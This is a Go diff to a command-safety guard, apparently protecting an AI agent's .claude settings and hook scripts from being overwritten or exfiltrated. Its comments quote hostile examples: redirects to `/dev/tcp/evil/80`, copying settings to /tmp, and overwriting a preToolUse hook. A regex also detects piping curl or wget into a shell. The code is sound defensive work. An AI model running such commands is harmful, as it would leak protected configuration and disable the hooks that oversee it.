@@ -10,7 +10,7 @@ import (
 )
 
 var (
-	reDeleteCmd     = regexp.MustCompile(`\b(rm|unlink|shred)\b`)
+	reDeleteCmd     = regexp.MustCompile(`\b(rm|unlink|shred|find|truncate)\b`)
 	reSymlinkCmd    = regexp.MustCompile(`\bln\b.*-s`)
 	reTraversal     = regexp.MustCompile(`\.\./`)
 	reCopyCmd       = regexp.MustCompile(`\b(cp|rsync|mv|tar|dd|tee)\b`)
@@ -38,8 +38,8 @@ func containsProtectedPathStr(s string) bool {
 }
 
 var (
-	deleteVerbs       = map[string]bool{"rm": true, "unlink": true, "shred": true}
-	copyVerbs         = map[string]bool{"cp": true, "rsync": true, "mv": true, "tar": true, "dd": true, "tee": true}
+	deleteVerbs       = map[string]bool{"rm": true, "unlink": true, "shred": true, "find": true, "truncate": true}
+	copyVerbs         = map[string]bool{"cp": true, "rsync": true, "mv": true, "tar": true, "dd": true, "tee": true, "truncate": true}
 	reMcpDangerousCmd = regexp.MustCompile(`(?i)\b(curl|wget|fetch)\b[^|]*\|\s*(sh|bash|zsh|source)\b|\bnpx?\s+(-y\s+)?https?://`)
 )
 
@@ -211,6 +211,19 @@ func copyIsDangerous(ctx *EvalContext) bool {
 		return false
 	}
 	cmds, err := ctx.ParsedCommands()
+	// A write redirect that clobbers a protected path (`echo x >
+	// .claude/settings.json`, `: > .claude/settings.json`) or that exfiltrates a
+	// protected read to a sink outside the repo (`cat .claude/settings.json >
+	// /tmp/exfil`, `> /dev/tcp/evil/80`) is dangerous no matter the command verb.
+	// This mirrors bashMutatesMcpConfig's write-redirect guard but, unlike the
+	// copy/exfil-verb path below, runs BEFORE the verb gate — so a plain redirect
+	// (no cp/curl/pipe) is caught. It also closes the redirect form of a hook-script
+	// overwrite (`echo evil > .claude/hooks/preToolUse.sh`).
+	for _, c := range cmds {
+		if redirectDanger(c, ctx.CWD) {
+			return true
+		}
+	}
 	// Trigger on a copy verb, a network/exfil verb, or any pipeline (which could
 	// stream a protected read to a sink). A bare protected path with none of
 	// these — e.g. `cat <protected>` or `rm <protected>` (SP-003's job) — is not
@@ -254,6 +267,29 @@ func copyArgDanger(cwd string) func(cmdscan.Command) bool {
 			return anyProtected(paths)
 		}
 	}
+}
+
+// redirectDanger reports whether a single command's write redirect either
+// clobbers a protected path or exfiltrates a protected read to a sink outside the
+// repo. A protected write target is always a clobber (`echo x >
+// .claude/settings.json`); an outside-repo target combined with reading a
+// protected path (in args or input redirects) is an exfiltration (`cat
+// .claude/settings.json > /tmp/exfil`, `> /dev/tcp/evil/80`). An in-repo redirect
+// target (e.g. `> settings.bak`) stays allowed as a benign backup.
+func redirectDanger(c cmdscan.Command, cwd string) bool {
+	if len(c.WriteRedirects) == 0 {
+		return false
+	}
+	readsProtected := anyProtected(nonFlagArgs(c.Args)) || anyProtected(c.ReadRedirects)
+	for _, target := range c.WriteRedirects {
+		if canon.ContainsProtectedPath(target) {
+			return true // clobbering a protected destination
+		}
+		if readsProtected && !isInsideRepo(target, cwd) {
+			return true // exfiltrating a protected read to an outside-repo sink
+		}
+	}
+	return false
 }
 
 // pipelineExfil reports whether any pipeline reads a protected source in an
